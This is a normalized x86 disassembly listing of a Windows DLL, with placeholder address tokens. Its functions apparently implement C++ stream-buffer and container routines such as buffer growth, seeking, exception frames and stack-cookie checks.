or [ esp + 0x158 ] 0xffffffff
push ebx
push 0x1
lea ecx [ esp + 0x118 ]
call sub_1000264e
mov ecx [ esp + 0x1c ]
sub_1000b702
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1005251d
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xb0 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc8 ]
mov [ fs : 0x0 ] eax
push r--data
lea ecx [ esp + 0x1c ]
call sub_10001362
and [ esp + 0xd0 ] 0x0
lea eax [ esp + 0xa4 ]
push eax
lea ebx [ esp + 0x1c ]
call sub_10015bc4
pop ecx
xor esi esi
xor edi edi
push esi
inc edi
push edi
mov ecx ebx
mov [ esp + 0xd8 ] 0x2
call sub_1000264e
push r--data
lea ecx [ esp + 0x70 ]
call sub_10001362
push esi
lea eax [ esp + 0xa8 ]
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0xd8 ] 0x3
call sub_1000c5a1
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0xd4 ] 0x4
call sub_1000d425
push esi
push edi
lea ecx [ esp + 0x20 ]
mov [ esp + 0xd8 ] 0x6
call sub_1000264e
mov [ esp + 0xd0 ] 0x3
mov ecx [ esp + 0x14 ]
cmp ecx esi
je r-xdata
push [ esp + 0x10 ]
lea eax [ esp + 0x8c ]
push eax
call sub_1000c5d8
lea eax [ esp + 0x88 ]
push eax
lea ecx [ esp + 0x54 ]
mov [ esp + 0xd4 ] 0x7
call sub_100025cf
mov [ esp + 0xd0 ] 0x8
mov eax [ esp + 0x64 ]
push [ esp + 0x80 ]
sub eax [ esp + 0x84 ]
lea ecx [ esp + 0x54 ]
push eax
lea eax [ esp + 0x3c ]
push eax
call sub_10009533
mov ecx eax
lea eax [ esp + 0x6c ]
mov [ esp + 0xd0 ] 0x9
call sub_10006e2c
mov bl al
neg bl
push esi
sbb bl bl
push edi
lea ecx [ esp + 0x3c ]
inc bl
mov [ esp + 0xd8 ] 0x8
call sub_1000264e
test bl bl
jne r-xdata
push esi
push edi
lea ecx [ esp + 0x74 ]
call sub_1000264e
push esi
push edi
lea ecx [ esp + 0xac ]
call sub_1000264e
mov ecx [ esp + 0xc8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xb0 ]
xor ecx esp
call sub_10027150
mov esp ebp
pop ebp
retn
call sub_1000af0a
push esi
push edi
lea ecx [ esp + 0x58 ]
call sub_1000264e
push esi
push edi
lea ecx [ esp + 0x90 ]
mov [ esp + 0xd8 ] 0x6
call sub_1000264e
lea eax [ esp + 0x10 ]
push esi
push eax
call sub_100241e0
pop ecx
pop ecx
jmp r-xdata
lea eax [ esp + 0x50 ]
push eax
call sub_10015e6c
pop ecx
cmp [ esp + 0x10 ] esi
setne al
test al al
je r-xdata
sub_1000b8f5
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push 0x0
mov ecx esi
mov [ esi + 0x18 ] 0xf
call sub_100021a7
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100021c3
mov eax esi
leave
retn 0xc
sub_1000b923
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
push edi
mov edi eax
mov ecx [ edi + 0xc ]
test ecx ecx
jne r-xdata
mov eax [ edi + 0x14 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
lea esi [ esp + 0x10 ]
call sub_1000986e
push [ esp + 0x14 ]
lea eax [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ ebp + 0x8 ]
push eax
mov eax edi
call sub_1000c052
push [ ebp + 0x8 ]
xor esi esi
inc esi
call sub_1000c0f9
mov [ edi + 0x10 ] eax
jmp r-xdata
mov ebx [ edi + 0x10 ]
mov edx ebx
sub edx ecx
sar edx 0x3
cmp edx eax
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_1000b98b
push 0x8
mov eax sub_1005139b
call sub_1002b2a6
mov ebx ecx
mov edi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov [ edi ] r--data
mov [ edi + 0x8 ] r--data
mov [ edi + 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea eax [ edi + 0xc ]
xor esi esi
push eax
inc esi
push edi
mov [ ebp - 0x10 ] esi
call sub_1000c120
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
mov eax [ eax + 0x4 ]
lea esi [ edi + 0xc ]
push esi
mov [ edi + eax ] r--data
mov [ ebp - 0x14 ] esi
call sub_1000c19c
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
cmp [ ebx + 0x18 ] 0x10
mov eax [ ebx + 0x14 ]
jb r-xdata
add ebx 0x4
mov ebx [ ebx + 0x4 ]
jmp r-xdata
mov eax edi
call sub_1002b37e
retn 0x4
push ebx
mov ebx eax
call sub_1000c470
and [ esi + 0x3c ] 0x0
and [ esi + 0x40 ] 0x0
test eax eax
je r-xdata
sub_1000ba1c
push 0x4
mov eax sub_1004fb09
call sub_1002b2a6
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x54 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea esi [ ecx - 0x48 ]
mov ecx esi
call sub_1000ba7f
mov ecx esi
call sub_1000ba54
call sub_1002b37e
retn
sub_1000ba7f
push esi
mov esi ecx
test [ esi + 0x40 ] 0x1
mov [ esi ] r--data
je r-xdata
mov ecx [ esi + 0x10 ]
xor eax eax
mov [ ecx ] eax
mov ecx [ esi + 0x20 ]
mov [ ecx ] eax
mov ecx [ esi + 0x30 ]
mov [ ecx ] eax
mov ecx [ esi + 0x14 ]
mov [ ecx ] eax
mov ecx [ esi + 0x24 ]
mov [ ecx ] eax
mov ecx [ esi + 0x34 ]
mov [ ecx ] eax
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] eax
mov ecx esi
pop esi
jmp sub_1000d27a
mov eax [ esi + 0x10 ]
push [ eax ]
call sub_100272e8
pop ecx
sub_1000bac8
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
test [ esi + 0x40 ] 0x8
push edi
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi + 0x24 ]
mov edi [ ecx ]
test edi edi
je r-xdata
mov edx [ esi + 0x24 ]
mov edi [ edx ]
push ebx
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ esi + 0x3c ]
cmp edi edx
jae r-xdata
test [ esi + 0x40 ] 0x2
jne r-xdata
mov ecx [ esi + 0x34 ]
mov ebx [ ecx ]
mov edx edi
add ebx edx
cmp edx ebx
jae r-xdata
pop edi
pop esi
leave
retn 0x4
mov eax [ esi + 0x34 ]
mov eax [ eax ]
add eax edi
mov [ ecx ] edx
mov ecx [ esi + 0x34 ]
sub eax edx
mov [ ecx ] eax
or eax 0xffffffff
jmp r-xdata
test edi edi
jne r-xdata
dec [ ecx ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
lea edx [ ecx + 0x1 ]
mov [ esi ] edx
jmp r-xdata
pop ebx
mov eax [ esi + 0x34 ]
mov ecx [ esi + 0x10 ]
mov ebx [ eax ]
sub ebx [ ecx ]
add ebx edi
xor ebx ebx
jmp r-xdata
mov [ ecx ] al
test eax eax
jbe r-xdata
push 0x20
pop eax
jmp r-xdata
mov eax ebx
shr eax 0x1
cmp eax 0x20
jae r-xdata
jne r-xdata
mov ecx 0x7fffffff
sub ecx eax
cmp ecx ebx
jae r-xdata
add eax ebx
push 0x0
push eax
mov [ ebp - 0x4 ] eax
call sub_10001fb6
mov edi eax
mov eax [ esi + 0x10 ]
mov edx [ eax ]
pop ecx
pop ecx
mov [ ebp - 0x8 ] edx
test ebx ebx
jbe r-xdata
test eax eax
shr eax 0x1
jne r-xdata
jne r-xdata
push ebx
push edx
push [ ebp - 0x4 ]
push edi
call sub_1000218b
mov edx [ ebp - 0x8 ]
add esp 0x10
test ebx ebx
mov ecx [ esi + 0x14 ]
mov eax edi
sub eax edx
add [ esi + 0x3c ] eax
mov eax [ esi + 0x24 ]
mov eax [ eax ]
mov ebx edi
sub eax edx
sub ebx edx
add [ ecx ] ebx
mov ecx [ esi + 0x24 ]
add eax edi
mov [ ecx ] eax
mov ecx edi
sub ecx eax
add ecx [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
mov [ eax ] ecx
test [ esi + 0x40 ] 0x4
je r-xdata
mov eax [ esi + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x3c ] edi
mov [ eax ] edi
mov eax [ esi + 0x24 ]
mov [ eax ] edi
mov eax [ esi + 0x34 ]
mov [ eax ] ecx
mov eax [ esi + 0x10 ]
test [ esi + 0x40 ] 0x4
mov [ eax ] edi
mov eax [ esi + 0x20 ]
jne r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
mov eax [ esi + 0x20 ]
mov eax [ eax ]
mov ebx [ esi + 0x10 ]
sub eax edx
add eax edi
mov [ ebx ] edi
mov edi [ esi + 0x20 ]
sub ecx eax
mov [ edi ] eax
mov eax [ esi + 0x30 ]
inc ecx
mov [ eax ] ecx
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x20 ]
and [ eax ] 0x0
mov eax [ esi + 0x30 ]
mov [ eax ] edi
jmp r-xdata
mov [ eax ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] 0x1
jmp r-xdata
mov eax [ esi + 0x34 ]
or [ esi + 0x40 ] 0x1
dec [ eax ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
lea eax [ ecx + 0x1 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
push edx
call sub_100272e8
pop ecx
test [ esi + 0x40 ] 0x1
je r-xdata
sub_1000bc65
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
or eax 0xffffffff
mov edx [ ecx + 0x10 ]
cmp eax [ edx ]
jbe r-xdata
mov edx [ esp + 0x4 ]
cmp edx 0xffffffff
je r-xdata
mov eax [ ecx + 0x30 ]
inc [ eax ]
mov eax [ ecx + 0x20 ]
dec [ eax ]
cmp edx 0xffffffff
je r-xdata
cmp dl [ eax - 0x1 ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ eax ] dl
mov eax edx
jmp r-xdata
test [ ecx + 0x40 ] 0x2
jne r-xdata
retn 0x4
sub_1000bcad
mov eax [ ecx + 0x20 ]
push edi
mov edi [ eax ]
test edi edi
jne r-xdata
mov edx [ ecx + 0x30 ]
push ebx
mov ebx [ edx ]
push esi
mov esi edi
add ebx esi
cmp esi ebx
jae r-xdata
or eax 0xffffffff
pop edi
retn
test [ ecx + 0x40 ] 0x4
jne r-xdata
movzx eax [ edi ]
jmp r-xdata
or eax 0xffffffff
mov esi [ ecx + 0x24 ]
mov esi [ esi ]
test esi esi
je r-xdata
pop esi
pop ebx
pop edi
retn
cmp esi edi
ja r-xdata
cmp [ ecx + 0x3c ] esi
jae r-xdata
cmp [ ecx + 0x3c ] edi
jbe r-xdata
mov esi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax esi
mov [ edx ] eax
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ecx + 0x3c ] esi
sub_1000bd0a
push ebp
mov ebp esp
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
test [ ebp + 0x14 ] 0x1
push ebx
push esi
push edi
je r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov edi [ eax ]
test edi edi
je r-xdata
mov [ ecx + 0x3c ] eax
mov esi [ r--data ]
mov edx [ edx ]
test edx edx
je r-xdata
cmp [ ebp + 0x10 ] 0x2
mov edx [ r--data ]
jne r-xdata
cmp [ ebp + 0x10 ] 0x2
mov edi [ r--data ]
jne r-xdata
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
mov ebx [ ecx + 0x3c ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
mov ebx [ ecx + 0x3c ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
test [ ebp + 0x14 ] 0x2
jne r-xdata
mov eax [ ecx + 0x10 ]
sub ebx [ eax ]
mov esi [ ebp + 0xc ]
add esi ebx
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
mov esi edi
jne r-xdata
mov ebx edx
mov eax [ ecx + 0x10 ]
sub ebx [ eax ]
mov esi [ ebp + 0xc ]
add esi ebx
jmp r-xdata
mov esi [ ebp + 0xc ]
mov esi edx
jmp r-xdata
mov ebx edi
test esi esi
jl r-xdata
test esi esi
jl r-xdata
mov esi [ ebp + 0xc ]
mov esi edx
jmp r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
cmp esi ebx
jg r-xdata
mov esi edi
jmp r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
cmp esi ebx
jg r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor ecx ecx
mov [ eax ] esi
pop esi
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
pop ebp
retn 0x10
mov edx [ ecx + 0x30 ]
sub eax edi
add eax esi
sub [ edx ] eax
mov edx [ ecx + 0x20 ]
add [ edx ] eax
test [ ebp + 0x14 ] 0x2
je r-xdata
sub eax edx
mov edx [ ecx + 0x34 ]
add eax esi
sub [ edx ] eax
mov ecx [ ecx + 0x24 ]
add [ ecx ] eax
jmp r-xdata
mov edx [ ecx + 0x24 ]
mov ebx [ edx ]
test ebx ebx
je r-xdata
mov eax [ ecx + 0x20 ]
mov edi [ eax ]
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
add eax ebx
mov [ edx ] edi
mov ecx [ ecx + 0x34 ]
sub eax edi
mov [ ecx ] eax
jmp r-xdata
sub_1000be41
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
push esi
lea esi [ edx + eax ]
mov eax [ ecx + 0x24 ]
mov edx [ eax ]
push edi
test edx edx
je r-xdata
mov edi [ r--data ]
cmp esi edi
je r-xdata
cmp [ ecx + 0x3c ] edx
jae r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
pop edi
mov [ eax ] esi
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop esi
pop ebp
retn 0x20
test [ ebp + 0x24 ] 0x1
push ebx
je r-xdata
mov [ ecx + 0x3c ] edx
test [ ebp + 0x24 ] 0x2
je r-xdata
mov edx [ ecx + 0x20 ]
mov edx [ edx ]
test edx edx
je r-xdata
mov esi edi
mov edx [ eax ]
test edx edx
je r-xdata
test esi esi
jl r-xdata
test esi esi
jl r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
cmp esi ebx
jg r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
cmp esi ebx
jg r-xdata
sub eax edx
mov edx [ ecx + 0x30 ]
add eax esi
sub [ edx ] eax
mov edx [ ecx + 0x20 ]
add [ edx ] eax
test [ ebp + 0x24 ] 0x2
je r-xdata
sub eax edx
mov edx [ ecx + 0x34 ]
add eax esi
sub [ edx ] eax
mov ecx [ ecx + 0x24 ]
add [ ecx ] eax
jmp r-xdata
pop ebx
mov edx [ ecx + 0x24 ]
mov ebx [ edx ]
test ebx ebx
je r-xdata
mov eax [ ecx + 0x20 ]
mov edi [ eax ]
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
add eax ebx
mov [ edx ] edi
mov ecx [ ecx + 0x34 ]
sub eax edi
mov [ ecx ] eax
jmp r-xdata
sub_1000bf2a
push esi
push edi
lea edi [ ecx - 0xc ]
lea esi [ edi + 0xc ]
mov ecx esi
call sub_1000ba54
push esi
mov [ esi ] r--data
call sub_10021dee
test [ esp + 0x10 ] 0x1
pop ecx
je r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
push edi
call sub_100272e8
pop ecx
sub_1000bf77
push 0x10
mov eax sub_10051f1e
call sub_1002b2d9
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ edi + 0x4 ] ebx
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x28 ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x1c ] edi
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
call sub_1000d094
mov [ ebp - 0x18 ] al
xor esi esi
inc esi
mov [ ebp - 0x4 ] esi
cmp al bl
je r-xdata
lea ecx [ eax + 0x4 ]
call sub_10021d6a
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
push [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x2
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + edi + 0x28 ]
mov eax [ ecx ]
push 0xffffffff
push [ ebp + 0xc ]
call [ eax + 0x1c ]
add [ edi + 0x4 ] eax
cmp eax [ ebp + 0x10 ]
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x28 ]
cmp eax ebx
je r-xdata
push ebx
push [ ebp - 0x14 ]
call sub_100081bf
mov [ ebp - 0x4 ] esi
jmp r-xdata
mov [ ebp - 0x14 ] 0x3
mov eax edi
call sub_1002b37e
retn 0xc
lea ecx [ eax + 0x4 ]
call sub_10021d73
sub_1000bfe9
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
xor esi esi
inc esi
push esi
push eax
call sub_100080a5
mov [ ebp - 0x4 ] esi
mov eax r-xdata
retn
or ecx 0x4
sub_1000c052
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0xc ]
mov eax [ edi + 0x10 ]
sub eax ebx
test eax 0xfffffff8
jne r-xdata
lea esi [ ebp - 0x8 ]
call sub_1000986e
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
call sub_10027827
cmp eax [ ebp - 0x8 ]
je r-xdata
push [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x10 ]
push edi
call sub_1000c1e8
mov ebx [ edi + 0xc ]
lea esi [ ebp - 0x10 ]
call sub_1000986e
mov edi [ ebp - 0x10 ]
mov esi [ ebp - 0xc ]
mov ebx edi
mov [ ebp - 0xc ] esi
test edi edi
jne r-xdata
mov eax [ edi ]
jmp r-xdata
call sub_10027827
xor eax eax
mov eax [ ebp + 0x14 ]
sub eax [ ebp - 0x4 ]
sar eax 0x3
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
lea esi [ esi + ecx * 8 ]
cmp esi [ eax + 0x10 ]
ja r-xdata
call sub_10027827
test edi edi
je r-xdata
xor edi edi
mov edi [ edi ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax + 0x4 ] esi
pop esi
mov [ eax ] ebx
pop ebx
leave
retn 0x10
cmp esi [ edi + 0xc ]
jae r-xdata
sub_1000c0f9
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x8 ]
mov eax ebx
push esi
call sub_1000c6fa
add esp 0xc
lea eax [ ebx + esi * 8 ]
pop edi
leave
retn 0x4
sub_1000c120
push 0x4
mov eax sub_10051351
call sub_1002b2a6
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
push esi
call sub_1000c160
mov eax [ esi + 0x8 ]
mov eax [ eax + 0x4 ]
mov [ esi + eax + 0x8 ] r--data
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax esi
call sub_1002b37e
retn 0x8
sub_1000c160
push 0x4
mov eax sub_1005132b
call sub_1002b2a6
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push [ ebp + 0xc ]
mov [ esi + eax ] r--data
mov eax [ esi ]
and [ esi + 0x4 ] 0x0
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_1000c4f3
mov eax esi
call sub_1002b37e
retn 0x8
sub_1000c19c
push 0x0
mov eax sub_1004fa36
call sub_1002b2a6
mov esi [ ebp + 0x8 ]
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_10021d39
and [ ebp - 0x4 ] 0x0
push 0x4
call sub_1002738b
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_1000736c
jmp r-xdata
mov [ esi + 0x38 ] eax
mov eax esi
call sub_1000c55f
mov eax esi
call sub_1002b37e
retn 0x4
sub_1000c1e8
push 0x18
mov eax sub_10050434
call sub_1002b2d9
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0xc ]
test edx edx
jne r-xdata
mov eax [ edi + 0x14 ]
sub eax edx
sar eax 0x3
mov [ ebp - 0x18 ] eax
and [ ebp - 0x18 ] edx
jmp r-xdata
inc eax
cmp [ ebp - 0x18 ] eax
jae r-xdata
call sub_100155d9
mov ecx [ edi + 0x10 ]
mov eax ecx
sub eax edx
mov edx 0x1fffffff
sar eax 0x3
mov esi edx
sub esi eax
cmp esi 0x1
jae r-xdata
sub ecx [ ebp + 0x10 ]
mov eax [ ebx ]
xor esi esi
sar ecx 0x3
inc esi
add ebx 0x4
cmp ecx esi
mov [ ebp - 0x24 ] eax
push ebx
lea ecx [ ebp - 0x20 ]
jae r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x1
sub edx ecx
cmp edx [ ebp - 0x18 ]
jae r-xdata
call sub_1000af36
mov [ ebp - 0x4 ] 0x5
mov esi [ edi + 0x10 ]
push esi
lea ebx [ esi - 0x8 ]
push esi
mov ecx ebx
call sub_1000c610
mov [ edi + 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp + 0x8 ] eax
cmp eax ebx
je r-xdata
call sub_1000af36
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x8 ]
push eax
push [ edi + 0x10 ]
call sub_1000c610
mov [ ebp - 0x4 ] 0x3
mov ebx [ edi + 0x10 ]
lea eax [ ebp - 0x24 ]
push eax
mov eax ebx
sub eax [ ebp + 0x10 ]
sar eax 0x3
sub esi eax
call sub_1000c0f9
mov [ ebp - 0x4 ] 0x2
add [ edi + 0x10 ] 0x8
mov edi [ edi + 0x10 ]
mov esi [ ebp + 0x10 ]
add edi 0xfffffff8
jmp r-xdata
add [ ebp - 0x18 ] ecx
and [ ebp - 0x18 ] 0x0
jmp r-xdata
lea edi [ eax + 0x8 ]
mov esi eax
cmp eax edi
je r-xdata
mov edi esi
sub edi ebx
cmp esi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
call sub_1000c424
mov ecx [ ebp + 0x10 ]
sub ecx [ edi + 0xc ]
and [ ebp + 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
sar ecx 0x3
push ebx
xor esi esi
lea ebx [ eax + ecx * 8 ]
inc esi
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] ecx
call sub_1000c0f9
mov ebx [ ebp - 0x1c ]
mov ecx [ edi + 0xc ]
push ebx
push [ ebp + 0x10 ]
mov [ ebp + 0x8 ] esi
call sub_1000c610
mov eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x10 ]
lea eax [ ebx + eax * 8 + 0x8 ]
push eax
push [ edi + 0x10 ]
mov [ ebp + 0x8 ] 0x2
call sub_1000c610
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ edi + 0x10 ]
mov eax [ edi + 0xc ]
mov esi ecx
sub esi eax
sar esi 0x3
inc esi
test eax eax
je r-xdata
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] eax
jae r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x20 ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0x24 ]
call sub_10017055
add esi 0x8
cmp esi edi
jne r-xdata
sub ebx 0x8
lea esi [ edi + ebx ]
mov eax ebx
call sub_10017055
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x10 ]
lea eax [ ebp - 0x24 ]
call sub_10017055
add esi 0x8
jmp r-xdata
mov eax [ ebp - 0x18 ]
lea eax [ ebx + eax * 8 ]
mov [ edi + 0x14 ] eax
lea eax [ ebx + esi * 8 ]
mov [ edi + 0x10 ] eax
mov [ edi + 0xc ] ebx
jmp r-xdata
push ecx
call sub_10009849
push [ edi + 0xc ]
call sub_100272e8
pop ecx
call sub_1002b37e
retn 0xc
call sub_1000af0a
sub_1000c2e7
cmp [ ebp + 0x8 ] 0x1
mov esi [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
jle r-xdata
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jle r-xdata
lea eax [ esi + edi * 8 ]
push eax
mov eax esi
call sub_10009849
push esi
call sub_100272e8
pop ecx
push ebx
push ebx
call sub_1002ae74
sub ecx [ ebp + 0x10 ]
mov eax [ ebx ]
xor esi esi
sar ecx 0x3
inc esi
add ebx 0x4
cmp ecx esi
mov [ ebp - 0x24 ] eax
push ebx
lea ecx [ ebp - 0x20 ]
jae r-xdata
lea eax [ esi + edi * 8 + 0x8 ]
push eax
lea eax [ esi + edi * 8 ]
call sub_10009849
call sub_1000af36
mov [ ebp - 0x4 ] 0x5
mov esi [ edi + 0x10 ]
push esi
lea ebx [ esi - 0x8 ]
push esi
mov ecx ebx
call sub_1000c610
mov [ edi + 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp + 0x8 ] eax
cmp eax ebx
je r-xdata
call sub_1000af36
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x8 ]
push eax
push [ edi + 0x10 ]
call sub_1000c610
mov [ ebp - 0x4 ] 0x3
mov ebx [ edi + 0x10 ]
lea eax [ ebp - 0x24 ]
push eax
mov eax ebx
sub eax [ ebp + 0x10 ]
sar eax 0x3
sub esi eax
call sub_1000c0f9
mov [ ebp - 0x4 ] 0x2
add [ edi + 0x10 ] 0x8
mov edi [ edi + 0x10 ]
mov esi [ ebp + 0x10 ]
add edi 0xfffffff8
jmp r-xdata
lea edi [ eax + 0x8 ]
mov esi eax
cmp eax edi
je r-xdata
mov edi esi
sub edi ebx
cmp esi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x20 ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0x24 ]
call sub_10017055
add esi 0x8
cmp esi edi
jne r-xdata
sub ebx 0x8
lea esi [ edi + ebx ]
mov eax ebx
call sub_10017055
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x10 ]
lea eax [ ebp - 0x24 ]
call sub_10017055
add esi 0x8
jmp r-xdata
call sub_1002b37e
retn 0xc
call sub_1000af0a
sub_1000c424
push ebp
mov ebp esp
sub esp 0x10
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x8
jae r-xdata
xor ecx ecx
mov eax ecx
shl eax 0x3
push eax
call sub_1002738b
pop ecx
leave
retn
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_10027401
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_1002ae74
int3
sub_1000c470
mov eax [ esi + 0x40 ]
and eax 0x6
cmp al 0x6
je r-xdata
retn 0x4
push edi
push 0x0
push ebx
call sub_10001fb6
push ebx
push [ esp + 0x14 ]
mov edi eax
push ebx
push edi
call sub_1000218b
add esp 0x18
test [ esi + 0x40 ] 0x4
lea eax [ edi + ebx ]
mov [ esi + 0x3c ] eax
jne r-xdata
mov ecx [ esi + 0x40 ]
test cl 0x2
jne r-xdata
mov ecx [ esi + 0x10 ]
mov [ ecx ] edi
mov ecx [ esi + 0x20 ]
mov [ ecx ] edi
mov ecx [ esi + 0x30 ]
mov [ ecx ] ebx
or [ esi + 0x40 ] 0x1
pop edi
test cl 0x10
jne r-xdata
mov ecx [ esi + 0x14 ]
mov [ ecx ] edi
mov ecx [ esi + 0x24 ]
mov [ ecx ] eax
mov ecx edi
sub ecx eax
mov eax [ esi + 0x34 ]
add ecx ebx
mov [ eax ] ecx
mov eax [ esi + 0x20 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax edi
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x20 ]
and [ eax ] 0x0
mov eax [ esi + 0x30 ]
mov [ eax ] edi
sub_1000c4f3
push 0x0
mov eax sub_10051310
call sub_1002b2a6
